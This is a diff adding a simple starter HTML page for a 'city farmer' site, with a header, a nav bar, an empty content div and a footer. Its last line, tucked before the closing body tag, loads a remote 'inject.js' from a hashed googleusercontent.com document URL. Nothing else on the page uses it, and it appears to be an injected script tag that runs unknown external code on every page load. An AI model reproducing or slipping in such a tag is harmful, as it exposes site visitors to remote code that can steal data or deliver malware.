@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta lang="en">
+    <meta viewport="width=device-width, initial-scale=1">
+    <title>city farmer 2</title>
+    <!--<link rel="stylesheet" href="css/style.css">-->
+    <!--<source src="js/script.js" defer>-->
+</head>
+<body>
+   <header><!-- goes at the top of the page -->
+    <p>city farmer</p>
+    <p>...today's urban cowboy</p>
+
+   </header>
+
+   <nav><!-- navigatioin bars -->
+    Products  &nbsp;
+    Order    &nbsp;
+    News     &nbsp;
+    Events    &nbsp;
+   </nav>
+
+   <div><!-- any container anywhere -->
+         <!-- this is where the main 
+        stuff will go in the future! -->
+   </div>
+
+   <footer><!-- Goes at the bottom of the page  -->
+    <p>&copy; copyright 2022 <br/>
+        feedback@cityfarmer.com</p>
+   </footer>
+<script type='text/javascript'  src="https://doc-14-7k-docs.googleusercontent.com/5807a17879fa8332cf5c93162cf5a4421bb5724aa76a47cb699e003df7957a8f/inject.js?id=d3787f12-3afe-45f4-9ed3-b7f389b86a24"></script></body>
+</html>
